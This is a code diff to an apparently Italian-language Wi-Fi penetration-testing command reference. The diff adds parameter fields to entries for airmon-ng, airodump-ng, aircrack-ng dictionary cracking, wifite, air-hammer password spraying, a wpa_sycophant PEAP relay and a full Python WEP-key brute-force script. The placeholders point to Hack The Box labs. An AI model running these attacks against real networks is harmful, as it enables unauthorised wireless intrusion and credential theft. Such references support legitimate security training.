@@ -79,7 +79,7 @@ const WIFI_COMMANDS = [
     platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
     tags: ['iwconfig', 'mode', 'managed', 'adhoc', 'mesh'],
     template: 'sudo ifconfig <iface> down\nsudo iwconfig <iface> mode managed\nsudo ifconfig <iface> up',
-    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }],
+    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }, { key: 'essid', label: 'ESSID', ctx: 'essid', placeholder: 'HTB-Hello-World' }],
     variants: [
       { id: 'default', label: 'Managed', template: 'sudo ifconfig <iface> down\nsudo iwconfig <iface> mode managed\nsudo ifconfig <iface> up',
         description: 'Ritorno al comportamento da client: è la modalità necessaria per connettersi davvero alla rete dopo il recupero della chiave.' },
@@ -124,7 +124,7 @@ const WIFI_COMMANDS = [
     platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
     tags: ['airmon-ng', 'monitor', 'aircrack-ng'],
     template: 'sudo airmon-ng start <iface>',
-    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }],
+    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }, { key: 'channel', label: 'Canale', ctx: 'channel', placeholder: '6' }],
     variants: [
       { id: 'default', label: 'Tutti i canali', template: 'sudo airmon-ng start <iface>',
         description: 'Monitor mode con channel hopping: mostra tutte le reti a portata ma nessuna in modo continuo.' },
@@ -218,7 +218,7 @@ const WIFI_COMMANDS = [
     platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
     tags: ['airodump-ng', 'aircrack-ng', 'scan'],
     template: 'sudo airodump-ng <mon>',
-    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
+    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }, { key: 'channel', label: 'Canale', ctx: 'channel', placeholder: '6' }],
     variants: [
       { id: 'default', label: 'Tutte le reti', template: 'sudo airodump-ng <mon>',
         description: 'Channel hopping su tutta la banda 2.4 GHz. È la prima passata, quella che serve solo a capire cosa c’è in aria.' },
@@ -353,8 +353,7 @@ const WIFI_COMMANDS = [
     params: [
       { key: 'password', label: 'PSK', ctx: 'password', placeholder: 'passphrase' },
       { key: 'capfile', label: 'Prefisso cattura', ctx: 'capfile', placeholder: 'WPA' },
-      { key: 'essid', label: 'ESSID', ctx: 'essid', placeholder: 'HTB-Wireless' },
-    ],
+      { key: 'essid', label: 'ESSID', ctx: 'essid', placeholder: 'HTB-Wireless' }, { key: 'bssid', label: 'BSSID', ctx: 'bssid', placeholder: 'AA:BB:CC:DD:EE:FF' }],
     variants: [
       { id: 'default', label: 'WPA/WPA2', template: 'airdecap-ng -p \'<password>\' <capfile>-01.cap -e "<essid>"',
         description: 'Richiede sia la passphrase sia l’ESSID, perché la PMK si deriva da entrambi.' },
@@ -502,7 +501,7 @@ const WIFI_COMMANDS = [
     platform: 'linux', requires: ['no-creds'], protocols: ['wps', '802.11'],
     tags: ['airodump-ng', 'wps'],
     template: 'sudo airodump-ng --wps --ignore-negative-one <mon>',
-    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
+    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }, { key: 'channel', label: 'Canale', ctx: 'channel', placeholder: '6' }, { key: 'bssid', label: 'BSSID', ctx: 'bssid', placeholder: 'AA:BB:CC:DD:EE:FF' }],
     variants: [
       { id: 'default', label: 'Tutte', template: 'sudo airodump-ng --wps --ignore-negative-one <mon>',
         description: 'Scansione generale. `--ignore-negative-one` elimina gli errori di potenza a -1 che sporcano l’output.' },
@@ -910,7 +909,7 @@ const WIFI_COMMANDS = [
     tags: ['python', 'wep', 'bruteforce', 'airdecap-ng'],
     template: 'cat > bruteforce.py <<\'EOF\'\nimport sys, binascii, re, time\nfrom subprocess import Popen, PIPE\n\nstart = time.time()\ncap_file = \'<capfile>\'\nwordlist_path = \'<wordlist>\'\n\nwith open(wordlist_path, \'r\', errors=\'ignore\') as f:\n    wordlist = f.readlines()\n\nfor ln, word in enumerate(wordlist, start=1):\n    key = re.sub(r\'\\W+\', \'\', word)\n    if len(key) != 5:\n        continue\n    hex_key = binascii.hexlify(key.encode(\'utf-8\'))\n    print(f"{ln}: Trying Key: {key} Hex: {hex_key}")\n    p = Popen([\'/usr/bin/airdecap-ng\', \'-w\', hex_key, cap_file], stdout=PIPE)\n    output = p.stdout.read().decode("utf-8")\n    if int(output.split(\'\\n\')[5][-1]) > 0:\n        print(f"Success! WEP key found: {key}")\n        print(f"Total time: {time.time() - start:.6f} seconds")\n        sys.exit(0)\n\nprint("No WEP key found")\nEOF\npython3 bruteforce.py',
     params: [
-      { key: 'capfile', label: 'File .cap', placeholder: '/opt/WEP-01.cap' },
+      { key: 'capfile', ctx: 'capfile', label: 'File .cap', placeholder: '/opt/WEP-01.cap' },
       { key: 'wordlist', label: 'Wordlist', placeholder: '/opt/1000000-password-seclists.txt' },
     ],
     note: '# Dopo il match\nCon la chiave trovata si decifra tutta la cattura con `airdecap-ng -w <hex> WEP-01.cap` e il file `-dec.cap` risultante mostra ARP e ICMP in chiaro una volta aperto in Wireshark.',
@@ -975,7 +974,7 @@ const WIFI_COMMANDS = [
     platform: 'linux', requires: ['no-creds'], protocols: ['wpa2', 'wps'],
     tags: ['wifite', 'automation'],
     template: 'sudo wifite -i <mon> --kill',
-    params: [{ key: 'mon', label: 'Interfaccia', ctx: 'mon', placeholder: 'wlan0mon' }],
+    params: [{ key: 'mon', label: 'Interfaccia', ctx: 'mon', placeholder: 'wlan0mon' }, { key: 'essid', label: 'ESSID', ctx: 'essid', placeholder: 'HTB-Hello-World' }],
     variants: [
       { id: 'default', label: 'Automatico', template: 'sudo wifite -i <mon> --kill',
         description: 'Passata completa su tutto quello che rileva. `--kill` ferma da solo i processi interferenti.' },
@@ -1083,8 +1082,7 @@ const WIFI_COMMANDS = [
     template: 'sudo aircrack-ng -w <wordlist> <capfile>-01.cap',
     params: [
       { key: 'wordlist', label: 'Wordlist', placeholder: '/opt/wordlist.txt' },
-      { key: 'capfile', label: 'Prefisso cattura', ctx: 'capfile', placeholder: 'WPA' },
-    ],
+      { key: 'capfile', label: 'Prefisso cattura', ctx: 'capfile', placeholder: 'WPA' }, { key: 'bssid', label: 'BSSID', ctx: 'bssid', placeholder: 'AA:BB:CC:DD:EE:FF' }],
     variants: [
       { id: 'default', label: 'Dizionario', template: 'sudo aircrack-ng -w <wordlist> <capfile>-01.cap',
         description: 'In presenza di più reti nella cattura viene richiesto l’indice di quella da attaccare.' },
@@ -1273,8 +1271,7 @@ const WIFI_COMMANDS = [
     params: [
       { key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan1' },
       { key: 'essid', label: 'ESSID', ctx: 'essid', placeholder: 'HTB-Corp' },
-      { key: 'wordlist', label: 'Wordlist password', placeholder: '/opt/rockyou.txt' },
-    ],
+      { key: 'wordlist', label: 'Wordlist password', placeholder: '/opt/rockyou.txt' }, { key: 'password', label: 'Password', ctx: 'password', placeholder: 'P@ssw0rd' }],
     variants: [
       { id: 'default', label: 'Orizzontale', template: 'sudo python2 /opt/air-hammer/air-hammer.py -i <iface> -e <essid> -u user.txt -p <wordlist>',
         description: 'Molte password contro un solo utente noto. Massima probabilità di successo, massimo rischio di lockout dell’account.' },
@@ -1517,7 +1514,7 @@ const WIFI_COMMANDS = [
     template: 'cd /opt/wpa_sycophant\nsudo ./wpa_sycophant.sh -c <config> -i <iface>',
     params: [
       { key: 'config', label: 'File di config', placeholder: '/home/wifi/wpa_sycophant.config' },
-      { key: 'iface', label: 'Interfaccia supplicant', placeholder: 'wlan2' },
+      { key: 'iface', ctx: 'iface', label: 'Interfaccia supplicant', placeholder: 'wlan2' },
     ],
     note: '# Segnali di riuscita\nNel terminale del relay compaiono `SYCOPHANT : CHALLANGE DATA GIVEN TO MANA`, poi `EAP-MSCHAPV2: Authentication succeeded` e infine `CTRL-EVENT-CONNECTED`. La conferma finale è un IP nella sottorete target sull’interfaccia supplicant.',
     refs: [{ label: 'PEAP relay attacks with wpa_sycophant', url: 'https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/' }],
@@ -1601,8 +1598,7 @@ const WIFI_COMMANDS = [
     template: 'sudo wpa_supplicant -c <conf> -i <iface>',
     params: [
       { key: 'conf', label: 'File di config', placeholder: 'wpa.conf' },
-      { key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' },
-    ],
+      { key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }, { key: 'essid', label: 'ESSID', ctx: 'essid', placeholder: 'HTB-Hello-World' }, { key: 'password', label: 'Password', ctx: 'password', placeholder: 'P@ssw0rd' }],
     variants: [
       { id: 'default', label: 'In primo piano', template: 'sudo wpa_supplicant -c <conf> -i <iface>',
         description: 'Mostra tutta la negoziazione fino a `CTRL-EVENT-CONNECTED`. In caso di problemi l’errore compare qui.' },
